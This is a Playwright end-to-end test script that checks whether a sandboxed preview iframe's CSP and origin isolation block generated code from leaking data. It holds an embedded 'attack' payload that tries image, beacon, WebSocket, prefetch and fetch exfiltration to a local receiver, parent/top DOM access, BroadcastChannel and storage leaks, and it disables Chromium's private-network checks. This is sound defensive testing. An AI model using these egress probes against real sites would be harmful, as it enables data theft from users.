// P0-2 preview isolation in real Chromium (Playwright).
// Verifies the frame CSP blocks EVERY external egress channel from generated code, that CSP
// survives document.open/write, cross-origin parent/top access is blocked, and that two
// projects get distinct origins (storage/BroadcastChannel isolation). A local receiver on
// :9876 proves nothing actually leaves the browser.
// LocalNetworkAccessChecks is disabled ONLY so loopback iframes load in the test harness;
// same-origin policy and CSP remain fully enforced (that is what we are testing).
import { createRequire } from 'node:module';
import { createServer } from 'node:http';
import { writeFileSync } from 'node:fs';
const require = createRequire('/Users/psw/Projects/toss-toi-test/e2e/package.json');
const { chromium } = require('@playwright/test');
const out = []; const log = s => { out.push(s); console.log(s); };
const STUDIO = 'http://localhost:5173';

const hits = [];
const receiver = createServer((req, res) => { hits.push(req.method + ' ' + req.url); res.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); res.end('ok'); });
await new Promise(r => receiver.listen(9876, '127.0.0.1', r));

const attack = pid => `
const results={project:${JSON.stringify(pid)},origin:location.origin,csp:[]};
addEventListener('securitypolicyviolation',e=>results.csp.push(e.effectiveDirective));
async function tf(u,k){try{const r=await fetch(u);results[k]='status '+r.status;}catch(e){results[k]='blocked';}}
try{new Image().src='http://127.0.0.1:9876/img-'+${JSON.stringify(pid)};results.img='attempted';}catch(e){results.img='threw';}
try{results.beacon=navigator.sendBeacon('http://127.0.0.1:9876/beacon','x')?'queued':'refused';}catch(e){results.beacon='threw';}
try{new WebSocket('ws://127.0.0.1:9876/ws');results.ws='constructed';}catch(e){results.ws='threw';}
try{const l=document.createElement('link');l.rel='prefetch';l.href='http://127.0.0.1:9876/prefetch';document.head.appendChild(l);}catch(e){}
await tf('http://127.0.0.1:9876/fetch','fetchExt');
await tf('http://localhost:7400/healthz','fetchAgent');
await tf('/frame.js','fetchSelfRelative');
try{results.parentDom=String(parent.location.href);}catch(e){results.parentDom='blocked:'+e.name;}
try{results.topDom=String(top.document.title);}catch(e){results.topDom='blocked:'+e.name;}
try{const bc=new BroadcastChannel('toi-shared');bc.postMessage('leak-'+${JSON.stringify(pid)});results.bc='posted';}catch(e){results.bc='threw';}
try{localStorage.setItem('toi',${JSON.stringify(pid)});results.lsOwn=localStorage.getItem('toi');results.lsForeign=localStorage.getItem('foreign');}catch(e){results.ls='threw:'+e.name;}
try{results.winopen=window.open('http://localhost:5173/','x')?'opened':'null';}catch(e){results.winopen='threw';}
console.log('R3RESULT '+JSON.stringify(results));
export default null;`;

const parentHtml = pid => `<!doctype html><html><body><script>
window.__done=false;
const bc=new BroadcastChannel('toi-shared');window.__bcCross=[];bc.onmessage=e=>window.__bcCross.push(String(e.data));
const f=document.createElement('iframe'); f.setAttribute('sandbox','allow-scripts allow-same-origin');
f.src='http://p-'+${JSON.stringify(pid)}+'.preview.localhost:5174/frame.html?parentOrigin='+encodeURIComponent(location.origin);
addEventListener('message',ev=>{
 if(ev.data&&ev.data.kind==='frame_ready') ev.source.postMessage({kind:'load',token:{projectId:${JSON.stringify(pid)},revision:1,attemptId:'a',sourceDigest:'d',manifestDigest:'m'},importMap:{imports:{}},code:window.__attack,mountId:'root'},'*');
});
document.body.appendChild(f);
setTimeout(()=>{window.__done=true;},2500);
</script></body></html>`;

const browser = await chromium.launch({ args: ['--disable-features=LocalNetworkAccessChecks,PrivateNetworkAccessChecks,BlockInsecurePrivateNetworkRequests'] });
async function run(pid) {
  const ctx = await browser.newContext(); const page = await ctx.newPage();
  let result = null;
  page.on('console', m => { const t = m.text(); if (t.startsWith('R3RESULT ')) result = JSON.parse(t.slice(9)); });
  await ctx.route(STUDIO + '/r3-parent', rt => rt.fulfill({ status:200, contentType:'text/html', body: parentHtml(pid) }));
  await page.addInitScript(c => { window.__attack = c; }, attack(pid));
  await page.goto(STUDIO + '/r3-parent');
  await page.waitForFunction(() => window.__done, null, { timeout: 12000 }).catch(()=>{});
  await page.waitForTimeout(300);
  const bcCross = await page.evaluate(() => window.__bcCross);
  await ctx.close();
  return { result, bcCross };
}
const PID_A='aaaaaaaa-0000-4000-8000-000000000001', PID_B='bbbbbbbb-0000-4000-8000-000000000002';
const A = await run(PID_A);
const B = await run(PID_B);
log('# Project A (' + PID_A + ') generated-code egress attempts:');
log(JSON.stringify(A.result, null, 1));
log('\n# Project B origin: ' + B.result?.origin + '  (distinct from A: ' + (A.result?.origin !== B.result?.origin) + ')');
log('# Parent BroadcastChannel cross-delivery observed: ' + JSON.stringify(A.bcCross) + ' (parent origin differs from preview origin, so none expected)');
log('\n# Local egress receiver hits (MUST be empty for containment): ' + JSON.stringify(hits));
log('# CSP active after document.write (violations from post-write app code): ' + ((A.result?.csp?.length ?? 0) > 0) + ' directives=' + JSON.stringify([...new Set(A.result?.csp ?? [])]));

await browser.close(); receiver.close();
writeFileSync(new URL('./p02-browser.out', import.meta.url), out.join('\n')+'\n');
console.log('\n# wrote p02-browser.out');
